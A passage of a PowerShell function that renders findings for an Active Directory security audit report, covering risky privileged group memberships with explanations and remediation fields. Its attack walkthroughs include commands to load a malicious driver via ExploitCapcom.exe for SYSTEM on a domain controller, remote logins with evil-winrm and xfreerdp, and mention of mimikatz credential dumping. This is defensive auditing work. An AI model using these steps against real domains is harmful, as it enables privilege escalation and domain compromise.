                                            <p>The Account Operators group should be empty as they can login locally to domain controllers. Account Operators are one privilege escalation vulnerability away from fully compromising the domain. Further, account operators have permission to delete all domain admin accounts except the default RID 500 "Administrator" account. Best practice is to keep the group empty in favour of a custom role-based group giving only the privileges required.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/">Link 1</a></p>
                                            <p><a href="https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Upon compromise of an account in the Account Operators group, the attacker can log in locally to a domain controller (tier 0 asset).</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/accountoperator-1.png" alt="Logging into domain controller">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. This shows a user with no other privilege but a member of the "Account Operators" group having a command prompt on the domain controller. The user is a one privilege escalation vulnerability on the DC away from fully compromising the domain.</p>
                                                    <p class="code">whoami && hostname && net user accountoperator /domain</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/accountoperator-2.png" alt="Logging into domain controller">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -match "Print Operators group") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Members of the Print Operators group can log onto domain controllers and load malicious drivers to escalate privileges.</td>
                                        <td>T1078.002</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>$($finding.MemberCount)</td></tr>
                                            <tr><td class="grey">Members</td><td>$($finding.Members -replace ",", "<br>")</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The Print Operators group should be empty. Members can manage, create, share, and delete printers that are connected to domain controllers in the domain. Members of this group can logon locally and load and unload device drivers on all domain controllers in the domain as members are given the "SeLoadDriverPrivilege". An attacker could use these privileges to load a malicious driver on a domain controller and escalate privileges to fully compromise the domain.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/">Link 1</a></p>
                                            <p><a href="https://cybernetgen.com/abusing-seloaddriverprivilege-for-privilege-escalation/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Print Operators group to see if they have the necessary privilege to perform this attack.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/printoperator-1.png" alt="Checking for members of print operators">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. This shows a user with no other privilege but a member of the "Print Operators" group having the "SeLoadDriverPrivilege" on a domain controller.</p>
                                                    <p class="code">whoami /all</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/accountoperator-2.png" alt="Checking SeLoadDriverPrivilege">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                            <div class="attack-text">
                                                <p>3. An attacker can use the "SeLoadDriverPrivilege to load a malicious driver and gain a SYSTEM command prompt on a domain controller, fully compromising the domain.</p>
                                                <p class="code">.\ExploitCapcom.exe</p>
                                            </div>
                                            <span class="image-cell">
                                                <img src="/Private/Report/Images/RBAC/printoperator-3.png" alt="Loading a malicious driver">
                                            </span>
                                        </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -match "Remote Desktop Users group") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Members of the Remote Desktop Users group can remotely log into domain controllers.</td>
                                        <td>T1078.002</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>$($finding.MemberCount)</td></tr>
                                            <tr><td class="grey">Members</td><td>$($finding.Members -replace ",", "<br>")</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The BUILTIN Remote Desktop Users group permits members to connect remotely to domain controllers within the domain. The Remote Desktop Users group should be empty as by default domain admins can RDP into a domain controller so do not need to be added. Access to domain controllers should be restricted to domain admins only.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#remote-desktop-users">Link 1</a></p>
                                            <p><a href="https://4sysops.com/archives/allow-non-admins-to-access-remote-desktop/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Remote Desktop Users group to see if they have the necessary privilege to perform this attack.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/remotedesktop-1.png" alt="Checking for members of remote desktop users">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A user can simply connect to the domain controller via a remote desktop client and can an interactive session on the tier 0 device.</p>
                                                    <p class="code">xfreerdp /u:rdpuser /p:'Password123!' /d:test.local /v:dc.test.local /cert-ignore /dynamic-resolution</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/remotedesktop-2.png" alt="Logging in via RDP">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -match "Remote Management Users group") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Members of the Remote Management Users group can remotely log into domain controllers.</td>
                                        <td>T1078.002</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>$($finding.MemberCount)</td></tr>
                                            <tr><td class="grey">Members</td><td>$($finding.Members -replace ",", "<br>")</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The BUILTIN Remote Management Users group permits members to connect remotely to domain controllers within the domain via WMI reousrves over WSMan protocols. By default domain admins can connect via WinRM to a domain controller, so do not need to be added. Access to domain controllers should be restricted to domain admins only.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#remote-management-users">Link 1</a></p>
                                            <p><a href="https://learn.microsoft.com/en-us/windows-server/administration/server-manager/configure-remote-management-in-server-manager">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Remote Management Users group to see if they have the necessary privilege to perform this attack.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/remotemanagement-1.png" alt="Checking for members of remote management users">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A user can simply connect to the domain controller via a remote management client and can an interactive session on the tier 0 device.</p>
                                                    <p class="code">evil-winrm -i dc.test.local -u remotemanagement -p Password123!</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/remotemanagement-2.png" alt="Logging in via WinRM">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -match "Schema Admins group") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Members of the Schema Admins group can add a backdoor or break the domain.</td>
                                        <td>T1078.002</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>$($finding.MemberCount)</td></tr>
                                            <tr><td class="grey">Members</td><td>$($finding.Members -replace ",", "<br>")</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The Schema Admins group permits members to modify the domain Schema and should be empty. This group is used when the directory Schema requires altering, for example when an application such as microsoft exchange requires installation. Once a modification has been performed, such as the creation of new objects, it cannot be undone and therefore unauthorised or accidental change can require a complete domain rebuild.</p>
                                            <p>Further, members of the group can add a backdoor to the schema structure that would provide an attacker full control of any group created after the schema modification.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://cube0x0.github.io/Pocing-Beyond-DA/ ">Link 1</a></p>
                                            <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#schema-admins">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Schema Admins group to see if they have the necessary privilege to perform this attack.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/schemaadmin-1.png" alt="Checking for members of schema admins">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. Members of the group can modify the schema, which can be viewed in the ADSI editor.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/schemaadmin-2.png" alt="Viewing the schema">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -match "Protected Users group") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>All privileged accounts should be added to the Protected Users group.</td>
                                        <td>T1078.002, T1003</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Member count</td><td>$($finding.MemberCount)</td></tr>
                                            <tr><td class="grey">Members</td><td>$($finding.Members -replace ",", "<br>")</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>The Protected Users group was introduced to provide better protection from credential theft attacks for privileged accounts and should be considered within a defense-in-depth strategy. Logged in user credentials are stored in memory in the local system, where from there they are vulnerable to theft. An attacker could dump the credential memory of the system and steal password hashes of all logged in users (notably accounts of higher privileges if administrative zoning is not enforced). Members of this group have non-configurable protection applied, including the following security benefits:</p>
                                            <li>Prevents credential caching of any type (removing the ability for an attacker to dump privileged credentials from computer memory).</li>
                                            <li>Disables NTLM authentication in favour of Kerberos. This means accounts will use the stronger Kerberosv5 protocol for authentication.</li>
                                            <li>Reduce Kerberos ticket lifetime to reduce persistent access (no renewal of TGT beyond 4-hour lifetime).</li>
                                            <li>Enforces usage of strong encryption algorithms such as AES - meaning cracking user password hashes will take significantly longer.</li>
                                            <li>Prevents any type of Kerberos delegation.</li>
                                            <p>All privileged accounts (domain admins & administrators) should be protected from attackers as much as possible and adding them to the protected users group is an effective way to secure them.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#protected-users">Link 1</a></p>
                                            <p><a href="https://blog.netwrix.com/2015/02/20/add-sensitive-user-accounts-to-active-directory-protected-users-group/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. All privileged accounts should be a member of the Protected Users group in ActiveDirectory.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/protecteduser-1.png" alt="Checking for members of protected users">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. If a user is not a member of this group and logs into a computer, their credentials will remain in memory until the computer is restarted. This means they are available for theft from an attacker.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/protecteduser-2.png" alt="Logging in interactively">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. Using tools like mimikatz, attackers with system access can extract credentials from memory and then impersonate the users that have logged into the system to move laterally and escalate privileges. If a domain admins credentials are stolen from a system they have logged into, the domain has been fully compromised.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/protecteduser-3.png" alt="Dumping cached credentials">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Add all privilged users</p>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -match "Account is sensitive") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>All privileged accounts should be protected from impersonation from attackers.</td>
                                        <td>TA0008</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Users</td><td>$($finding.Users -replace "`r?`n", "<br>")</td></tr>
                                            <tr><td class="grey">Account cannot be delegated</td><td>$($finding.AccountNotDelegated)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Privileged accounts are defined as users that have admin privileges, for example domain admins / administrators.</p>
                                            <p>$($finding.Issue)</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts">Link 1</a></p>
                                            <p><a href="https://www.sans.org/blog/protecting-privileged-domain-accounts-safeguarding-access-tokens/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. All privileged accounts should have the account is sensitive and cannot be delegated flag set within Active Directory. This will mean that when impersonating privileged for example in constrained delegation, the attack will simply fail showing how important this is to implement.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/RBAC/sensitiveaccount-1.png" alt="Checking for sensitive accounts">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>$remediation</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
        }
        $html += "</tbody></table></div>"
    }
    return $html
}